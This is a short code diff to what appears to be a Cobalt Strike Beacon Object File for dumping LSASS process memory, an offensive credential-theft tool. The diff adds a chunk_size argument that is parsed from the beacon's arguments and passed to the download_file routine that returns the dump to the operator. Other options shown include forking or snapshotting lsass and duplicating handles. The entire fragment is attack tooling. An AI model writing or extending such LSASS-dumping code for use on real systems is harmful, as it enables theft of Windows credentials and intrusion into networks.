@@ -15,6 +15,7 @@ void go(char* args, int length)
     DWORD          lsass_pid;
     LPCSTR         dump_path;
     BOOL           write_dump_to_disk;
+    DWORD          chunk_size;
     BOOL           fork_lsass;
     BOOL           snapshot_lsass;
     BOOL           duplicate_handle;
@@ -54,6 +55,7 @@ void go(char* args, int length)
     lsass_pid = BeaconDataInt(&parser);
     dump_path = BeaconDataExtract(&parser, NULL);
     write_dump_to_disk = (BOOL)BeaconDataInt(&parser);
+    chunk_size = BeaconDataInt(&parser);
     use_valid_sig = (BOOL)BeaconDataInt(&parser);
     fork_lsass = (BOOL)BeaconDataInt(&parser);
     snapshot_lsass = (BOOL)BeaconDataInt(&parser);
@@ -221,6 +223,7 @@ void go(char* args, int length)
     else
     {
         success = download_file(
+            chunk_size,
             dump_path,
             dc.BaseAddress,
             dc.rva);
